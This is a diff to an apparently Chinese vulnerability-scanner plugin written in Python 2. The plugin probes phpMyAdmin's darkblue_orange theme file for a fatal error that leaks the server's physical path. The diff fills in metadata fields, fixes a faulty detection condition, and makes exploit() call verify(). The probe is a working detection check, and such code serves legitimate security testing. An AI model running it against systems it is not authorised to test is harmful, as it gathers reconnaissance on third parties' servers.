@@ -10,15 +10,15 @@ class Vuln(ABVuln):
     name = 'PHPMyAdmin /themes/darkblue_orange/layout.inc.php 泄漏服务器物理路径' # 漏洞名称
     level = VulnLevel.MED # 漏洞危害级别
     type = VulnType.INFO_LEAK # 漏洞类型
-    disclosure_date = ''  # 漏洞公布时间
+    disclosure_date = 'Unkonwn'  # 漏洞公布时间
     desc = '''
         PHPMyAdmin爆路径方法 weburl+phpmyadmin/themes/darkblue_orange/layout.inc.php
     ''' # 漏洞描述
     ref = 'http://huaidan.org/archives/1642.html' # 漏洞来源
-    cnvd_id = '' # cnvd漏洞编号
-    cve_id = '' #cve编号
+    cnvd_id = 'Unkonwn' # cnvd漏洞编号
+    cve_id = 'Unkonwn' #cve编号
     product = 'PHPMyAdmin'  # 漏洞应用名称
-    product_version = ''  # 漏洞应用版本
+    product_version = 'Unkonwn'  # 漏洞应用版本
 
 
 class Poc(ABPoc):
@@ -39,14 +39,14 @@ class Poc(ABPoc):
                 verify_url = '{target}'.format(target=self.target)+path+payload
                 req = urllib2.Request(verify_url)
                 content = urllib2.urlopen(req).read()
-                if 'getImgPath()' in content and 'Fatal error:' and 'on line' in content:
+                if 'getImgPath()' in content and 'Fatal error:' in content and 'on line' in content:
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        super(Poc, self).exploit()
+        self.verify()
         
 
 if __name__ == '__main__':
